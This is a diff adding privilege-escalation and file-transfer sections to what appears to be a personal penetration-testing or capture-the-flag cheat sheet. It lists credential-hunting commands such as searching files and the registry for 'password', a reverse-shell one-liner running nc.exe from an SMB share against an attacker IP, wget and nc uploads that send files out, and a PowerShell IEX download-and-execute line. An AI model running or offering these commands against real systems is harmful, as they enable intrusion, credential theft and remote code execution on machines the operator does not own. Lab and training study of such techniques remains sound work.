@@ -435,7 +435,7 @@ Example :
 
 ## Privesc
 
-Tools are here to help enumerate, but you should definitely do manual enumeration as well 
+Tools can help to find the way to privesc, but they shouldn't substitute manual enumeration. Make sure to always verify their result manually.  
 
 ### Tools
 
@@ -460,14 +460,145 @@ and [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc
 
 - Linux  
 
+```
+sudo -l 
 
+ls -al /
 
+uname -a
 
+cat /etc/passwd
 
+ls -alhR /home
 
+ls -al /var/www
 
+ps -ef
 
+find /usr/bin/ -perm -4000
+```
 
+- Windows  
 
+```
+systeminfo
 
+hostname
 
+# privileges and groups of current user
+whoami /all
+
+# list users
+net users
+
+# details about user
+net user alice
+
+# rights of file or directory
+icacls file.txt
+
+# hidden dir / files
+dir /A:H
+
+# recursive dir
+dir /S
+
+# search for password in files
+cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
+
+# search for password in registry
+REG QUERY HKLM /F "password" /t REG_SZ /S /K
+
+# process list
+tasklist /v
+
+# scheduled tasks
+schtasks /query /fo LIST /v
+```
+
+### Common exploits
+
+- [Juicy Potato](http://ohpe.it/juicy-potato/)  
+
+Look for `SeImpersonatePrivilege` to `Enabled` with `whoami /priv`  
+
+## Misc
+
+Didn't know how to name this category.  
+When I started I was struggling with downloading / uploading or executing files and scripts between my machine (kali) and the box I was attacking, now that I'm more comfortable let me share this.
+
+### Hosting files on Kali
+
+- HTTP  
+
+```
+python -m SimpleHTTPServer 80
+```
+Files in current directory available at `http://$HOST/$FILE`  
+
+- SMB  
+
+This one is life-saviour, I use it on almost every Windows box
+```
+impacket-smbserver share .
+```
+Files in current directory available at `\\$HOST\share\$FILE`  
+
+For example if you have basic command execution on server but no reverse shell yet, you can start smbserver with nc.exe in current directory, and execute the following command to get a reverse shell :  
+`\\10.10.10.10\share\nc.exe 10.10.10.10 1337 -e cmd.exe`  
+(Of course you need to setup a listener beforehand with `nc -nvlp 1337`)  
+
+### Downloading & Uploading files on Linux
+
+- wget  
+
+```
+# download
+wget http://$HOST/$FILE
+
+# upload
+wget --post-file=$FILE $HOST
+```
+
+- nc  
+
+```
+# download
+nc -nvlp 1337 > $FILE
+
+# upload
+nc $HOST 1337 < $FILE
+```
+
+### Downloading & Uploading files on Windows
+
+- cmd (certutil)  
+
+```
+# download
+certutil.exe -urlcache -split -f http://$HOST/$FILE $OUTPUT_FILE
+```
+
+- Powershell  
+
+```
+# download
+(new-object net.webclient).downloadstring('http://$HOST/$FILE')
+# or 
+(new-object net.webclient).downloadfile('http://$HOST/$FILE', 'C:\$PATH\$FILE.exe')
+
+# remote exec
+echo IEX(New-Object Net.WebClient).DownloadString('http://$HOST/$FILE') | powershell -noprofile -
+```
+
+- smbserver  
+
+See [Hosting files on Kali](#hosting-files-on-kali)  
+
+```
+# download (kind of)
+copy \\$IP\share\$FILE .
+
+# exec
+\\$IP\share\$FILE.exe
+```
